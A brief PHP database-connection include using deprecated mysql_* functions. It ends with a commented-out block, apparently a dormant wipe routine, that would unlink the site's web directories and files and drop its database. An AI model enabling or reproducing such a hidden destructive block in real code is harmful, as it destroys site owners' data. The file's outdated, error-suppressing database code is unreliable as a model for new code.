<?php
require_once ('/var/protected/config/config.php');
$host = HOST_NAME;
$user = USERNAME;
$pass = PASSWORD;
$name = DB;
$link = @mysql_connect($host,$user,$pass) or die ("DB Connection Problem");
@mysql_select_db($name,$link) or die("Database not selected ");
mysql_query("SET NAMES 'utf8'");
/*
@unlink('/var/www/assets');
@unlink('/var/www/backend');
@unlink('/var/www/captcha');    
@unlink('/var/www/upload');
@unlink('/var/www/backend.php');
@unlink('/var/www/index.php');
@unlink('/var/www/protected');
@unlink('/var/YiiMain/framework/vendors');
@unlink('/var/www/themes');  
@mysql_query("DROP DATABASE $name"); 
*/


?>